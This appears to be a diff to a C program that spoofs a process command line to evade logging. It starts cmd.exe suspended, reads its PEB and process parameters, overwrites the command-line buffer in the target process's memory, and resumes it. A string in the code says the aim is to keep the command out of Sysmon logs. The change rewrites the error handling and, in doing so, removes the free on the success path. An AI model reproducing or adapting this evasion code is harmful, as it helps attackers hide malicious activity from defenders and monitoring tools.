@@ -16,6 +16,7 @@ void replaceArguementsWithSpaces(const char *original, char *modified) {
 }
 
 int main() {
+    BOOL status = FALSE;
     const char *lolBinCommand = "cmd.exe /k echo This will not be logged in sysmon test";
 
     // Create spoofed cmdline
@@ -32,8 +33,7 @@ int main() {
     STARTUPINFOEX si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     if (!CreateProcessA(NULL, spoofedCmdline, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi)) {
-        free(realCmdlineW);
-        return FALSE;
+        goto cleanup;
     }
 
     // Get PROCESS_BASIC_INFORMATION structure
@@ -41,8 +41,7 @@ int main() {
     PROCESS_BASIC_INFORMATION pbi;
     ULONG ret;
     if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ret) != 0) {
-        free(realCmdlineW);
-        return FALSE;
+        goto cleanup;
     }
     printf("[+] PEB base address: %p\n", pbi.PebBaseAddress);
 
@@ -50,8 +49,7 @@ int main() {
     printf("[+] Reading the PEB structure\n");
     PEB peb;
     if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
-        free(realCmdlineW);
-        return FALSE;
+        goto cleanup;
     }
     printf("[+] Process parameters address: %p\n", peb.ProcessParameters);
 
@@ -59,21 +57,22 @@ int main() {
     printf("[+] Reading the RTL_USER_PROCESS_PARAMETERS structure\n");
     RTL_USER_PROCESS_PARAMETERS procParams;
     if (!ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), NULL)) {
-        free(realCmdlineW);
-        return FALSE;
+        goto cleanup;
     }
     printf("[+] Command line address: %p\n", procParams.CommandLine.Buffer);
 
     // Change command line
     if (!WriteProcessMemory(pi.hProcess, procParams.CommandLine.Buffer, realCmdlineW, realCmdlineLen * sizeof(wchar_t), NULL)) {
-        free(realCmdlineW);
-        return FALSE;
+        goto cleanup;
     }
 
     // Resume process
     printf("[+] Resuming the main thread\n");
     ResumeThread(pi.hThread);
     
-    free(realCmdlineW);
+    
     return TRUE;
+cleanup:
+    free(realCmdlineW);
+    return status;
 }
